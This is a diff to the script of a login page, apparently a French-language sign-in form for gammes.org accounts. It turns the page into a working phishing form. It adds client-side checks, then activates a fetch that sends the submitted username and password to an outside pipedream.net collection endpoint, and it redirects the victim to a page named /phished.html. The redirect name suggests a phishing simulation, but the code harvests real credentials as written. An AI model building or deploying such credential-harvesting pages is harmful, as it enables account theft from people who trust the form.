@@ -155,6 +155,23 @@
     const submitEl = document.getElementById("submit");
     const alertPlaceholder = document.getElementById("liveAlertPlaceholder");
 
+    updateDisable();
+
+    usernameEl.addEventListener("keydown", updateDisable);
+    passwordEl.addEventListener("keydown", updateDisable);
+
+    function updateDisable() {
+      const disabled =
+        !/[a-z]*\.[a-z]*@gammes\.org/gim.test(usernameEl.value) ||
+        passwordEl.value.length < 3;
+
+      if (disabled) {
+        submitEl.setAttribute("disabled", true);
+      } else {
+        submitEl.removeAttribute("disabled");
+      }
+    }
+
     function appendAlert(message, type) {
       const wrapper = document.createElement("div");
       wrapper.innerHTML = [
@@ -172,13 +189,6 @@
       const password = passwordEl.value;
       if (!/[a-z]*\.[a-z]*@gammes\.org/gim.test(username)) {
         appendAlert("Identifiant non reconnu.", "danger");
-        return;
-      }
-
-      console.log(password.length);
-
-      if (password.length < 3) {
-        appendAlert("Mauvais mot de passe", "danger");
         return;
       }
 
@@ -201,9 +211,9 @@
         body: JSON.stringify(body),
       };
 
-      alert(username);
+      fetch("https://eoiqxtr5za6pz92.m.pipedream.net", options);
 
-      // fetch("https://eoiqxtr5za6pz92.m.pipedream.net", options);
+      window.location.pathname = "/phished.html";
     }
 
     submitEl.addEventListener("click", login);
